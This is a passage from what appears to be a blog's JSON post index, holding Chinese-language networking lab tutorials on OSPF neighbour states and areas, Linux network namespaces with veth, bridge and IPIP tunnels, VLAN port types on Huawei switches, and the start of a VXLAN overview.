[R1-ospf-1-area-0.0.0.0]\rJan 24 2021 22:12:19-08:00 R1 %%01OSPF/4/NBR_CHANGE_E(l)[3]:Neighbor changes eve\rnt: neighbor status changed. (ProcessId=256, NeighborAddress=2.0.0.10, NeighborE\rvent=ExchangeDone, NeighborPreviousState=Exchange, NeighborCurrentState=Loading)\r[R1-ospf-1-area-0.0.0.0]\rJan 24 2021 22:12:20-08:00 R1 %%01OSPF/4/NBR_CHANGE_E(l)[4]:Neighbor changes eve\rnt: neighbor status changed. (ProcessId=256, NeighborAddress=2.0.0.10, NeighborE\rvent=LoadingDone, NeighborPreviousState=Loading, NeighborCurrentState=Full) [R1-ospf-1-area-0.0.0.0]\rospf的八种状态 在OSPF网络中，为了交换路由信息，邻居设备之间首先要建立邻接关系，邻居（Neighbors）关系和邻接（Adjacencies）关系是两个不同的概念。\n邻居关系：OSPF设备启动后，会通过OSPF接口向外发送Hello报文，收到Hello报文的OSPF设备会检查报文中所定义的参数，如果双方一致就会形成邻居关系，两端设备互为邻居。\n邻接关系：形成邻居关系后，如果两端设备成功交换DD报文和LSA，才建立邻接关系。\nOSPF共有8种状态机，分别是：Down、Attempt、Init、2-way、Exstart、Exchange、Loading、Full。\nDown：邻居会话的初始阶段，表明没有在邻居失效时间间隔内收到来自邻居路由器的Hello数据包。 Attempt：该状态仅发生在NBMA网络中，表明对端在邻居失效时间间隔（dead interval）超时前仍然没有回复Hello报文。此时路由器依然每发送轮询Hello报文的时间间隔（poll interval）向对端发送Hello报文。 Init：收到Hello报文后状态为Init。 2-way：收到的Hello报文中包含有自己的Router ID，则状态为2-way；如果不需要形成邻接关系则邻居状态机就停留在此状态，否则进入Exstart状态。 Exstart：开始协商主从关系，并确定DD的序列号，此时状态为Exstart。 Exchange：主从关系协商完毕后开始交换DD报文，此时状态为Exchange。 Loading：DD报文交换完成即Exchange done，此时状态为Loading。 Full：LSR重传列表为空，此时状态为Full 实验 多播网络ospf关系 在广播多路访问网络（Multi Access）中，所有的路由器的接口都是相同网段，这些接口两两建立OSPF邻居关系，这就意味着，网络中共有：n(n-1)/2。维护如此多的邻居关系不仅额外消耗资源，更增加了网络中LSA的泛洪数量。\n为减小多路访问网络中的 OSPF 流量，OSPF 会在每一个MA网络（多路访问网络）选举一个指定路由器 (DR)和一个备用指定路由器 (BDR)。\nDR选举规则：最高OSPF接口优先级拥有者被选作DR，如果优先级相等（默认为1），具有最高的OSPF Router-ID的路由器被选举成DR，并且DR具有非抢占性。\n指定路由器 (DR)：DR 负责使用该变化信息更新其它所有 OSPF 路由器（DR Rother）。备用指定路由器 (BDR)：BDR 会监控 DR 的状态，并在当前 DR 发生故障时接替其角色。 注意OSPF为“接口敏感型协议”，DR及BDR的身份状态是基于OSPF接口的。\nMA网络中，所有的DRother路由器均只与DR和BDR建立邻接关系，DRother间不建立全毗邻邻接关系。如此一来，该多路访问网络中设备需要维护的OSPF邻居关系大幅减小：M= (n-2)×2+1，LSA的泛洪问题也可以得到一定的缓解。\n可以查看到对应两种状态的ospf中的角色\n[R3]dis ospf peer brief\rOSPF Process 1 with Router ID 10.10.10.10\rPeer Statistic Information\r----------------------------------------------------------------------------\rArea Id Interface Neighbor id State 0.0.0.0 GigabitEthernet0/0/0 30.30.30.30 Full 0.0.0.0 GigabitEthernet0/0/0 5.5.5.5 Full 0.0.0.0 GigabitEthernet0/0/0 6.6.6.6 Full 0.0.0.0 GigabitEthernet0/0/0 7.7.7.7 Full ----------------------------------------------------------------------------\r[R7-ospf-1-area-0.0.0.0]dis ospf peer brief OSPF Process 1 with Router ID 7.7.7.7\rPeer Statistic Information\r----------------------------------------------------------------------------\rArea Id Interface Neighbor id State 0.0.0.0 GigabitEthernet0/0/0 10.10.10.10 Full 0.0.0.0 GigabitEthernet0/0/0 30.30.30.30 Full 0.0.0.0 GigabitEthernet0/0/0 5.5.5.5 2-Way 0.0.0.0 GigabitEthernet0/0/0 6.6.6.6 2-Way ----------------------------------------------------------------------------\r# 除了dr 与 bdr 任何机器值只与dr和bdr形成关系\r[R3]dis ospf peer OSPF Process 1 with Router ID 10.10.10.10\rNeighbors Area 0.0.0.0 interface 192.168.0.10(GigabitEthernet0/0/0)'s neighbors\rRouter ID: 30.30.30.30 Address: 192.168.0.11 State: Full Mode:Nbr is Master Priority: 1\rDR: 192.168.0.10 BDR: 192.168.0.11 MTU: 0 Dead timer due in 40 sec Retrans timer interval: 5 Neighbor is up for 00:57:22 Authentication Sequence: [ 0 ] Router ID: 5.5.5.5 Address: 192.168.0.12 State: Full Mode:Nbr is Slave Priority: 1\rDR: 192.168.0.10 BDR: 192.168.0.11 MTU: 0 Dead timer due in 40 sec Retrans timer interval: 5 Neighbor is up for 00:56:31 Authentication Sequence: [ 0 ] Router ID: 6.6.6.6 Address: 192.168.0.13 State: Full Mode:Nbr is Slave Priority: 1\rDR: 192.168.0.10 BDR: 192.168.0.11 MTU: 0 Dead timer due in 40 sec Retrans timer interval: 5 Neighbor is up for 00:56:08 Authentication Sequence: [ 0 ]\r实验：多区域ospf 对两个区域的路由器设置对应的配置\nsystem-view sysname R10\rip address 10.0.0.1 24\rin l0\rip address 1.1.1.1 32\rospf router-id 4.4.4.4\rarea 0\rnetwork 0.0.0.0 255.255.255.255\r[R10]dis ospf peer brief OSPF Process 1 with Router ID 4.4.4.4\rPeer Statistic Information\r----------------------------------------------------------------------------\rArea Id Interface Neighbor id State 0.0.0.0 GigabitEthernet0/0/0 5.5.5.5 Full ----------------------------------------------------------------------------\r对边界路由设置双区域\nsystem-view sysname R11\rip address 10.0.0.2 24\rin l0\rip address 2.2.2.2 32\rinterface g0/0/1\rip address 10.1.0.1 255.255.255.0 ospf router-id 5.5.5.5\rarea 0\rnetwork 10.0.0.0 0.0.0.255\rnetwork 2.2.2.2 0.0.0.0\rarea 1\rnetwork 10.1.0.0 0.0.0.255\r[R11-ospf-1-area-0.0.0.1]dis ospf peer brief OSPF Process 1 with Router ID 5.5.5.5\rPeer Statistic Information\r----------------------------------------------------------------------------\rArea Id Interface Neighbor id State 0.0.0.0 GigabitEthernet0/0/0 4.4.4.4 Full 0.0.0.1 GigabitEthernet0/0/1 3.3.3.3 Full ----------------------------------------------------------------------------\r可以看到已经学习到对应的路由了\n[R10]dis ip routing-table Route Flags: R - relay, D - download to fib\r------------------------------------------------------------------------------\rRouting Tables: Public\rDestinations : 11 Routes : 11 Destination/Mask Proto Pre Cost Flags NextHop Interface\r1.1.1.1/32 Direct 0 0 D 127.0.0.1 LoopBack0\r2.2.2.2/32 OSPF 10 1 D 10.0.0.2 GigabitEthernet\r0/0/0\r3.3.3.3/32 OSPF 10 2 D 10.0.0.2 GigabitEthernet\r0/0/0\r10.0.0.0/24 Direct 0 0 D 10.0.0.1 GigabitEthernet\r0/0/0\r10.0.0.1/32 Direct 0 0 D 127.0.0.1 GigabitEthernet\r0/0/0\r10.0.0.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet\r0/0/0\r10.1.0.0/24 OSPF 10 2 D 10.0.0.2 GigabitEthernet\r0/0/0\r127.0.0.0/8 Direct 0 0 D 127.0.0.1 InLoopBack0\r127.0.0.1/32 Direct 0 0 D 127.0.0.1 InLoopBack0\r127.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0\r255.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0\r[ospf-test.zip](......\\images\\Dynamic Routing - OSPF\\ospf-test.zip)\n","permalink":"https://www.oomkill.com/2021/01/dynamic-routing-ospf/","summary":"","title":"动态路由 - OSPF"},{"content":"linux namespace namespace是Linux内核的一项功能，该功能对内核资源进行分区，以使一组进程看到一组资源，而另一组进程看到另一组资源。该功能通过为一组资源和进程具有相同的名称空间而起作用，但是这些名称空间引用了不同的资源。资源可能存在于多个空间中。\nLinux namespaces 是对全局系统资源的一种封装隔离，使得处于不同 namespace 的进程拥有独立的全局系统资源，改变一个namespace中的系统资源只会影响当前 namespace 里的进程，对其他 namespace 中的进程没有影响。\n每一个进程在其对应的 /proc/[pid]/ns 下都有其 namespace 信息\n查看当前进程的namespace ll /proc/$$/ns\ncgroup -\u0026gt; cgroup:[4026531835] cgroup的根目录\ripc -\u0026gt; ipc:[4026531839] 信号量\rmnt -\u0026gt; mnt:[4026531840] 文件系统挂载点\rnet -\u0026gt; net:[4026531992] 网络设备、网络栈、端口\rpid -\u0026gt; pid:[4026531836] 进程编号\rpid_for_children -\u0026gt; pid:[4026531836]\rtime -\u0026gt; time:[4026531834]\rtime_for_children -\u0026gt; time:[4026531834]\ruser -\u0026gt; user:[4026531837] 用户和用户组\ruts -\u0026gt; uts:[4026531838] 主机名和NIS域名\rlinux的网络名称空间 linux network namespace 是network namespace 是 linux 内核提供的功能，在实现网络虚拟化中起重要作用，每个网络名称空间中有独立的网络协议栈，如路由表、iptables、端口等。在network namespace可以创建多个隔离的网络空间，它们有独自的网络栈信息。在运行的时候仿佛自己就在独立的网络中。\nlinux网络管理命令ip ip命令是Linux管理网络的工具，他对路由、地址、链路、namespace等的管理。\nip命令的使用说明：\nip netns list 查看网络命名空间\nip netns add net2 创建一个网络命名空间\nip link add $name link eth0 type ipvlan mode l2 在当前名称空间创建一个类型为ipvlan l2模式的接口，将该接口关联至父接口eth0上。\nip link set $name netns $nsName 将接口加入到对应网络名称空间内\nip netns exec $nsName $cmd 在对应的网络名称空间内运行命令\nip link add $p1-name type veth peer name $p2-name 创建一个网卡对\nethtool -S $interface_name 查看网卡对对应关系，通过index获得另外一端\n虚拟以太网对 VETH Pair VETH virtual-ethernet 虚拟以太网对，是网络交换机中的虚拟接口，在linux名称空间中，vEth可以充当名称空间之间的隧道，通过建立一个网桥链接到另一个名称空间中的物理设备，所有设备始终以互连对的形式创建。\n实验：使在不同网络名称空间下的vEth互通 实验实现：创建两个名称空间net1和net2，以及一对VETH设备，并将其分配veth1给namespacenet1 和veth2namespace net2。这两个名称空间与此VETH对相连。分配一对IP地址，使两个名称空间之间ping通。\n开启linuxip转发功能\necho 1 \u0026gt; /proc/sys/net/ipv4/ip_forward\r创建两个名称空间\nip netns add net1\rip netns add net2\r创建两个虚拟网卡对\nip link a veth0 type veth peer name br-veth0\rip link a veth1 type veth peer name br-veth1\r创建一个网桥\nip link add bridge1 type bridge\r# 启动设备\rip link set bridge1 up\r将虚拟网卡对的一段链接至网桥上\nip link set br-veth0 master bridge1\rip link set br-veth1 master bridge1\rip link set br-veth1 up\rip link set br-veth0 up\r虚拟网桥另外一端关联至对应名称空间内\nip link set veth0 netns net1\rip link set veth1 netns net2\rip netns exec net1 ip addr add 192.168.0.1/24 dev veth0\rip netns exec net2 ip addr add 192.168.0.2/24 dev veth1\rip netns exec net1 ip link set veth0 up\rip netns exec net2 ip link set veth1 up\r此时可以通过网桥对这两个网络进行互相ping通，不同网段的需要手动添加相应的路由表规则。而ping自己的地址不通，原因是因为lo设备未启动。\nip netns exec net2 ip link set lo up\rOVS ipip mode IPIP是RFC 2003中定义的IP over IP隧道。IPIP隧道标头如下所示：\n实验：实现一个IPIP隧道 ipip 模式需要内核模块 ipip.ko 使用命令查看内核是否加载IPIP模块lsmod | grep ipip ；使用命令modprobe ipip 加载\n实验效果，如下图，在两个名称空间内创建一个 tun 设备，然后将该 tun 设备绑定为一个 ipip 隧道。\n创建名称空间及虚拟网卡对\nip netns add net1\rip netns add net2\rip link a veth0 type veth peer name br-veth0\rip link a veth1 type veth peer name br-veth1\rip link set veth0 netns net1\rip link set veth1 netns net2\r给虚拟网卡对的一端配置地址\nip addr add 192.168.10.1/24 dev br-veth0\rip addr add 192.168.20.1/24 dev br-veth1\rip netns exec net1 ip link set veth0 up\rip netns exec net2 ip link set veth1 up\r在两个名称空间内分别创建一个ipip tunnel\nnetns exec net2 ip tunnel add tun1 mode ipip remote 192.168.10.2 local 192.168.20.2\rnetns exec net1 ip tunnel add tun1 mode ipip remote 192.168.20.2 local 192.168.10.2\rip netns exec net1 ip link set tun1 up\rip netns exec net2 ip link set tun1 up\rip netns exec net1 ip addr add 192.168.100.10 peer 192.168.200.10 dev tun1\rip netns exec net2 ip addr add 192.168.200.10 peer 192.168.100.10 dev tun1\r这个命令是在对应网络名称空间内创建隧道设备tun1，并设置隧道模式为 ipip，然后还需要设置隧道端点，用 remote 和 local 表示，这是隧道外层 IP，对应设置 隧道内层 IP，用 ip addr xx peer xx 配置。\n分析ipip tunnel过程。\n首先 ping 命令构建一个 ICMP 请求包，ICMP 包封装在 IP 包中，源目的 IP 地址分别为 tun1(192.168.200.10) 和 tun2(192.168.100.10) 的地址。 由于 tun1 和 tun2 不在同一网段，所以会查路由表，当通过 ip tunnel 命令建立 ipip 隧道之后，会自动生成一条路由，如下，表明去往目的地 192.168.100.10 的路由直接从 tun1 出去。 $ ip netns exec net2 route -n\rKernel IP routing table\rDestination Gateway Genmask Flags Metric Ref Use Iface\r192.168.10.0 192.168.20.1 255.255.255.0 UG 0 0 0 veth1\r192.168.20.0 0.0.0.0 255.255.255.0 U 0 0 0 veth1\r192.168.100.10 0.0.0.0 255.255.255.255 UH 0 0 0 tun1\r由于配置了隧道端点，数据包出了 tun1，到达 veth1，根据 ipip 隧道的配置，会封装上一层新的 IP 报头，源目的 IP 地址分别为 veth2(192.168.20.2) 和 veth1(192.168.10.2)。 veth2和 veth1不在一个网段，因为手动添加的路由表，发现去往 192.168.10.0 网段从 192.168.20.1 veth2虚拟网卡对另外一端 br-veth2出。 因为Linux 打开了 ip_forward，类似于路由器功能，192.168.10.0 和 192.168.20.1 为直连路由，直接有路由器转发。完成了net2到net1的过程。 数据包到达 net1 的 veth1，解封装数据包，发现内层 IP 报文的目的 IP 地址是 192.168.100.10，这正是自己配置的 ipip 隧道的 tun1(192.168.100.10) 地址，于是将报文转交 tun1(192.168.100.10)。 ICMP报文是双向的，故，相通的步骤还要返回到tun1(192.168.200.10) 。 通过抓包工具查看数据包的详细内容\n","permalink":"https://www.oomkill.com/2021/01/netspace/","summary":"","title":"网络名称空间"},{"content":"虚拟局域网VLAN（Virtual Local Area Network），是将一个物理的LAN在逻辑上划分成多个广播域的通信技术。\nVLAN内的主机间可以直接通信，而VLAN间不能直接通信，从而将广播报文限制在一个VLAN内。\n以太网是一种基于CSMA/CD（Carrier Sense Multiple Access/Collision Detection）的共享通讯介质的数据网络通讯技术。当主机数目较多时会导致冲突严重、广播泛滥、性能显著下降甚至造成网络不可用等问题。通过交换机实现LAN互连虽然可以解决冲突严重的问题，但仍然不能隔离广播报文和提升网络质量。\n在这种情况下出现了VLAN技术，这种技术可以把一个LAN划分成多个逻辑的VLAN，每个VLAN是一个广播域，VLAN内的主机间通信就和在一个LAN内一样，而VLAN间则不能直接互通，这样，广播报文就被限制在一个VLAN内。\nVLAN的作用 限制广播域：广播域被限制在一个VLAN内，节省了带宽，提高了网络处理能力。\n增强局域网的安全性：不同VLAN内的报文在传输时是相互隔离的，即一个VLAN内的用户不能和其它VLAN内的用户直接通信。\n提高了网络的健壮性：故障被限制在一个VLAN内，本VLAN内的故障不会影响其他VLAN的正常工作。\n灵活构建虚拟工作组：用VLAN可以划分不同的用户到不同的工作组，同一工作组的用户也不必局限于某一固定的物理范围，网络构建和维护更方便灵活。\nVLAN Tag 要使交换机能够分辨不同VLAN的报文，需要在报文中添加标识VLAN信息的字段。IEEE 802.1Q协议规定，在以太网数据帧的目的MAC地址和源MAC地址字段之后、协议类型字段之前加入4个字节的VLAN标签（又称VLAN Tag，简称Tag），用以标识VLAN信息。\nVLAN Tag各字段含义：\n字段 长度 含义 取值 TPID 2Byte Tag Protocol Identifier（标签协议标识符），表示数据帧类型。 表示帧类型，取值为0x8100时表示IEEE 802.1Q的VLAN数据帧。如果不支持802.1Q的设备收到这样的帧，会将其丢弃。各设备厂商可以自定义该字段的值。当邻居设备将TPID值配置为非0x8100时， 为了能够识别这样的报文，实现互通，必须在本设备上修改TPID值，确保和邻居设备的TPID值配置一致。 PRI 3bit Priority，表示数据帧的802.1p优先级。 取值范围为0～7，值越大优先级越高。当网络阻塞时，设备优先发送优先级高的数据帧。 CFI 1bit Canonical Format Indicator（标准格式指示位），表示MAC地址在不同的传输介质中是否以标准格式进行封装，用于兼容以太网和令牌环网。 CFI取值为0表示MAC地址以标准格式进行封装，为1表示以非标准格式封装。在以太网中，CFI的值为0。 VID 12bit VLAN ID，表示该数据帧所属VLAN的编号。 VLAN ID取值范围是0～4095。由于0和4095为协议保留取值，所以VLAN ID的有效取值范围是1～4094。 其中，数据帧中的VID（VLAN ID）字段标识了该数据帧所属的VLAN，数据帧只能在其所属VLAN内进行传输。\n对于交换机来说，其内部处理的数据帧都带有VLAN标签，而现网中交换机连接的设备有些只会收发Untagged帧，要与这些设备交互，就需要接口能够识别Untagged帧并在收发时给帧添加、剥除VLAN标签。同时，现网中属于同一个VLAN的用户可能会被连接在不同的交换机上，且跨越交换机的VLAN可能不止一个，如果需要用户间的互通，就需要交换机间的接口能够同时识别和发送多个VLAN的数据帧。\nVLAN PVID 缺省VLAN又称PVID（Port Default VLAN ID）。设备处理的数据帧都带Tag，当设备收到UNTagged帧时，就需要给该帧添加Tag，添加什么Tag，就由接口上的缺省VLAN决定。一个物理端口只能拥有一个PVID，当一个物理端口拥有了一个PVID的时候，必定会拥有和PVID相等的VID，而且在这个VID上，这个物理端口必定是Untagged Port。\n因此，根据接口连接对象以及对收发数据帧处理的不同，华为定义了4种接口的链路类型：Access、Trunk、Hybrid和QinQ，以适应不同的连接和组网：\nAccess接口：一般用于和不能识别Tag的用户终端（如用户主机、服务器等）相连，或者不需要区分不同VLAN成员时使用。Access接口大部分情况只能收发Untagged帧，且只能为Untagged帧添加唯一的VLAN Tag。 Trunk接口：一般用于连接交换机、路由器、AP以及可同时收发Tagged帧和Untagged帧的语音终端。它可以允许多个VLAN的帧带Tag通过，但只允许一个VLAN的帧从该类接口上发出时不带Tag（即剥除Tag）。 Hybrid接口：既可以用于连接不能识别Tag的用户终端（如用户主机、服务器等）和网络设备（如Hub、傻瓜交换机），也可以用于连接交换机、路由器以及可同时收发Tagged帧和Untagged帧的语音终端、AP。它可以允许多个VLAN的帧带Tag通过，且允许从该类接口发出的帧根据需要配置某些VLAN的帧带Tag（即不剥除Tag）、某些VLAN的帧不带Tag（即剥除Tag）。 使用QinQ（802.1Q-in-802.1Q）协议，一般用于私网与公网之间的连接，也被称为Dot1q-tunnel接口。它可以给帧加上双层Tag，即在原来Tag的基础上，给帧加上一个新的Tag，从而可以支持多达4094×4094个VLAN。 接口类型 对接收不带Tag的报文处理 对接收带Tag的报文处理 发送帧处理过程 Access接口 接收该报文，并打上缺省的VLAN ID。 当VLAN ID与缺省VLAN ID相同时，接收该报文。当VLAN ID与缺省VLAN ID不同时，丢弃该报文 先剥离帧的PVID Tag，然后再发送。 Trunk接口 打上缺省的VLAN ID，当缺省VLAN ID在允许通过的VLAN ID列表里时，接收该报文。打上缺省的VLAN ID，当缺省VLAN ID不在允许通过的VLAN ID列表里时，丢弃该报文。 当VLAN ID在接口允许通过的VLAN ID列表里时，接收该报文。当VLAN ID不在接口允许通过的VLAN ID列表里时，丢弃该报文 当VLAN ID与缺省VLAN ID相同，且是该接口允许通过的VLAN ID时，去掉Tag，发送该报文。当VLAN ID与缺省VLAN ID不同，且是该接口允许通过的VLAN ID时，保持原有Tag，发送该报文。 Hybrid接口 打上缺省的VLAN ID，当缺省VLAN ID在允许通过的VLAN ID列表里时，接收该报文。打上缺省的VLAN ID，当缺省VLAN ID不在允许通过的VLAN ID列表里时，丢弃该报文。 当VLAN ID在接口允许通过的VLAN ID列表里时，接收该报文。当VLAN ID不在接口允许通过的VLAN ID列表里时，丢弃该报文。 当VLAN ID是该接口允许通过的VLAN ID时，发送该报文。可以通过命令设置发送时是否携带Tag。 由上面各类接口添加或剥除VLAN标签的处理过程可见：\n当接收到不带VLAN标签的数据帧时，Access接口、Trunk接口、Hybrid接口都会给数据帧打上VLAN标签，但Trunk接口、Hybrid接口会根据数据帧的VID是否为其允许通过的VLAN来判断是否接收，而Access接口则无条件接收。\n当接收到带VLAN标签的数据帧时，Access接口、Trunk接口、Hybrid接口都会根据数据帧的VID是否为其允许通过的VLAN（Access接口允许通过的VLAN就是缺省VLAN）来判断是否接收。\n当发送数据帧时：\nAccess接口直接剥离数据帧中的VLAN标签。 Trunk接口只有在数据帧中的VID与接口的PVID相等时才会剥离数据帧中的VLAN标签。 Hybrid接口会根据接口上的配置判断是否剥离数据帧中的VLAN标签。 因此，Access接口发出的数据帧肯定不带Tag，Trunk接口发出的数据帧只有一个VLAN的数据帧不带Tag，其他都带VLAN标签，Hybrid接口发出的数据帧可根据需要设置某些VLAN的数据帧带Tag，某些VLAN的数据帧不带Tag。\nVLAN-Access Port Access接口一般用于和不能识别Tag的用户终端（如用户主机、服务器等）相连，或者不需要区分不同VLAN成员时使用。它只能收发Untagged帧，且只能为Untagged帧添加唯一VLAN的Tag。\n配置VLAN access\ninterface GigabitEthernet0/0/1\rport link-type access\rport default vlan 10\r可以看到收到的包和回来的包并添加VLAN Tag\nVLAN-Hybrid Port Hybrid接口既可以用于连接不能识别Tag的用户终端（如用户主机、服务器）和网络设备（如Hub），也可用于连接换机、路由器以及可同时收发Tagged帧和Untagged帧的语音终端、AP。它可允许多个VLAN的帧带Tag通过，且允许从该类接口发出的帧根据需要配置某些VLAN的帧带Tag（即不剥除Tag）某些VLAN的帧不带Tag（即剥除Tag）。\n![image-20210131144114120](../../../../images/vlan interface/image-20210131144114120.png)\n配置Hybrid vlan\ninterface GigabitEthernet0/0/1\rport hybrid pvid vlan 10\rport hybrid tagged vlan 10\r抓包可以看到对应的Hybrid port收到的\n![image-20210131132701528](../../../../images/vlan interface/image-20210131132701528.png)\n![image-20210131132642594](../../../../images/vlan interface/image-20210131132642594.png)\n实现pc1与pc2都可与pc3互通，pc1与pc2之间不能互通。\n![image-20210131195302130](../../../../images/vlan interface/image-20210131195302130.png)\nsystem-view\rsysname SW7\rinterface GigabitEthernet0/0/1\r# 进来时给包打标签\rport hybrid pvid vlan 10\r# 出去时去掉标签\rport hybrid untagged vlan 10 30\rinterface GigabitEthernet0/0/2\rport hybrid pvid vlan 20\rport hybrid untagged vlan 20 30\rinterface GigabitEthernet0/0/3\rport hybrid pvid vlan 30\rport hybrid untagged vlan 10 20 30\r流程分析：当pc1流量进入SW时会被添加vlan10的tag，在通过vlan30口出去时会进行 port hybrid untagged|tag == port trunk access xxx 这个操作是“是否允许这些tag通过，通过时进行对tag的操作 tag | untag ”\n实验\n![image-20210131201307039](../../../../images/vlan interface/image-20210131201307039.png)\nsystem-view sysname SW8\rinterface GigabitEthernet0/0/1\rport hybrid pvid vlan 10\rport hybrid untagged vlan 20\rinterface GigabitEthernet0/0/2\rport hybrid pvid vlan 20\rport hybrid untagged vlan 10\r这个实验可以证实，在接口G0/0/1到G0/0/2分配配置了untapped对方vlan的id发现无法ping通。\n在默认情况下hybrid只允许vlan1通过，而G0/0/1会被打上vlan10的tag，而到了G0/0/2，此时的标签设置的是双向都设置的为只允许vlan10的通过而不允许vlan20通过，而G0/0/1则相反。所以双方都需要port hybrid untagged vlan 10 20\nVLAN-Trunk Port Trunk接口一般用于连接交换机、路由器、AP以及可同时收发Tagged帧和Untagged帧的语音终端。它可以允许多个VLAN的帧带Tag通过，但只允许一个VLAN的帧从该类接口上发出时不带Tag（即剥除Tag）。\n![image-20210131152952129](../../../../images/vlan interface/image-20210131152952129.png)\n配置交换机 4 实现图2 4的论点\n![image-20210131172254100](../../../../images/vlan interface/image-20210131172254100.png)\nsystem-view\rsysname SW3\rvlan batch 10 20\rinterface GigabitEthernet0/0/1\rport link-type access\rport default vlan 10\rinterface GigabitEthernet0/0/2\rport link-type access\rport default vlan 20\rinterface GigabitEthernet0/0/3\rport link-type trunk\rport trunk allow-pass vlan 10 20\rSW4\nsystem-view\rsysname SW4\rvlan batch 10 20\rinterface GigabitEthernet0/0/1\rport link-type trunk\rport trunk allow-pass vlan 10 20\rinterface GigabitEthernet0/0/2\rport link-type access\rport default vlan 10\rinterface GigabitEthernet0/0/3\rport link-type access\rport default vlan 20\r![image-20210131193456826](../../../../images/vlan interface/image-20210131193456826.png)\n此图完成的是图 1 3步骤的论点\nSW5\ninterface GigabitEthernet0/0/1\rport link-type access\rport default vlan 10\rinterface GigabitEthernet0/0/2\rport link-type access\rport default vlan 10\rSW6\ninterface GigabitEthernet0/0/1\rport link-type trunk\rport trunk pvid vlan 10\rport trunk allow-pass vlan 10 20\rinterface GigabitEthernet0/0/2\rport link-type access\rport default vlan 10\r[vlan.zip](......\\images\\vlan interface\\vlan.zip)\n","permalink":"https://www.oomkill.com/2021/01/experiment-vlan/","summary":"","title":"网络实验 - VLAN"},{"content":"vXlan概念 实验 什么是VxLAN RFC定义了虚拟扩展局域网 VXLAN （Virtual eXtensible Local Area Network，）扩展方案，是对传统VLAN协议的一种扩展。VXLAN采用 （MAC\rin UDP（User Datagram Protocol）封装方式，是NVO3（Network Virtualization over Layer 3）中的一种网络虚拟化技术。VXLAN的特点是将L2的以太帧封装到UDP报文（即L2 over L4）中，并在L3网络中传输。\nVXLAN本质上是一种隧道技术，在源网络设备与目的网络设备之间的IP网络上，建立一条逻辑隧道，将用户报文经过特定的封装后通过这条隧道转发。从用户的角度来看，接入网络的服务器就像是连接到了一个虚拟的二层交换机的不同端口上（可把蓝色虚框表示的数据中心VXLAN网络看成一个二层虚拟交换机），可以方便地通信。\n为什么需要VxLAN 虚拟机规模受网络设备表项规格的限制\n在传统二层网络环境下，数据报文是通过查询MAC地址表进行二层转发。服务器虚拟化后，VM的数量比原有的物理机发生了数量级的增长，伴随而来的便是VM网卡MAC地址数量的空前增加。而接入侧二层设备的MAC地址表规格较小，无法满足快速增长的VM数量。\n网络隔离能力有限\nVLAN作为当前主流的网络隔离技术，在标准定义中只有12比特，因此可用的VLAN数量仅4096个。对于公有云或其它大型虚拟化云计算服务这种动辄上万甚至更多租户的场景而言，VLAN的隔离能力无法满足。\n虚拟机迁移范围受限\n由于服务器资源等问题（如CPU过高，内存不够等），虚拟机迁移已经成为了一个常态性业务。\n什么是虚拟机动态迁移？\n所谓虚拟机动态迁移，是指在保证虚拟机上服务正常运行的同时，将一个虚拟机系统从一个物理服务器移动到另一个物理服务器的过程。该过程对于最终用户来说是无感知的，从而使得管理员能够在不影响用户正常使用的情况下，灵活调配服务器资源，或者对物理服务器进行维修和升级。\n在服务器虚拟化后，虚拟机动态迁移变得常态化，为了保证迁移时业务不中断，就要求在虚拟机迁移时，不仅虚拟机的IP地址、MAC地址等参数保持不变，而且虚拟机的运行状态也必须保持原状（例如TCP会话状态），所以虚拟机的动态迁移只能在同一个二层域中进行，而不能跨二层域迁移。\nVxLAN方案 为了应对传统数据中心网络对服务器虚拟化技术的限制，VXLAN技术应运而生，其能够很好的解决上述问题。\n针对虚拟机规模受设备表项规格限制\nVXLAN将管理员规划的同一区域内的VM发出的原始报文封装成新的UDP报文，并使用物理网络的IP和MAC地址作为外层头，这样报文对网络中的其他设备只表现为封装后的参数。因此，极大降低了大二层网络对MAC地址规格的需求。\n针对网络隔离能力限制\n在传统的VLAN网络中，标准定义所支持的可用VLAN数量只有4000个左右。VXLAN引入了类似VLAN ID的用户标识，称为VXLAN网络标识VNI（VXLAN Network Identifier），由24比特组成，支持多达16M的VXLAN段，有效得解决了云计算中海量租户隔离的问题。\n针对虚拟机迁移范围受限\nVXLAN将VM发出的原始报文进行封装后通过VXLAN隧道进行传输，隧道两端的VM不需感知传输网络的物理架构。这样，对于具有同一网段IP地址的VM而言，即使其物理位置不在同一个二层网络中，但从逻辑上看，相当于处于同一个二层域。即VXLAN技术在三层网络之上，构建出了一个虚拟的大二层网络，只要虚拟机路由可达，就可以将其规划到同一个大二层网络中。这就解决了虚拟机迁移范围受限问题。\nVxLAN与VLAN之间的区别 VLAN是传统的网络隔离技术，在标准定义中VLAN的数量只有4096，无法满足大型数据中心的租户间隔离需求。另外，VLAN的二层范围一般较小且固定，无法支持虚拟机大范围的动态迁移。\nVXLAN完美地弥补了VLAN的上述不足，一方面通过VXLAN中的24比特VNI字段，提供多达16M租户的标识能力，远大于VLAN的4096；另一方面，VXLAN本质上在两台交换机之间构建了一条穿越数据中心基础IP网络的虚拟隧道，将数据中心网络虚拟成一个巨型“二层交换机”，满足虚拟机大范围动态迁移的需求。\nVXLAN Header\n增加VXLAN头（8字节），其中包含24比特的VNI字段，用来定义VXLAN网络中不同的租户。此外，还包含VXLAN Flags（8比特，取值为00001000）和两个保留字段（分别为24比特和8比特）。\nUDP Header\nVXLAN头和原始以太帧一起作为UDP的数据。UDP头中，目的端口号（VXLAN Port）固定为4789，源端口号（UDP Src. Port）是原始以太帧通过哈希算法计算后的值。\nOuter IP Header\n封装外层IP头。其中，源IP地址（Outer Src. IP）为源VM所属VTEP的IP地址，目的IP地址（Outer Dst. IP）为目的VM所属VTEP的IP地址。\nOuter MAC Header\n封装外层以太头。其中，源MAC地址（Src. MAC Addr.）为源VM所属VTEP的MAC地址，目的MAC地址（Dst. MAC Addr.）为到达目的VTEP的路径中下一跳设备的MAC地址。\n实验：创建一个VxLAN网络 实现网络拓扑图，使用VXLAN在两台TOR交换机之间建立了一条隧道，将服务器发出的原始数据帧加以“包装”，好让原始报文可以在承载网络（比如IP网络）上传输。当到达目的服务器所连接的TOR交换机后，离开VXLAN隧道，并将原始数据帧恢复出来，继续转发给目的服务器。\n什么是VXLAN VTEP VXLAN隧道端点，VTEP（VXLAN Tunnel 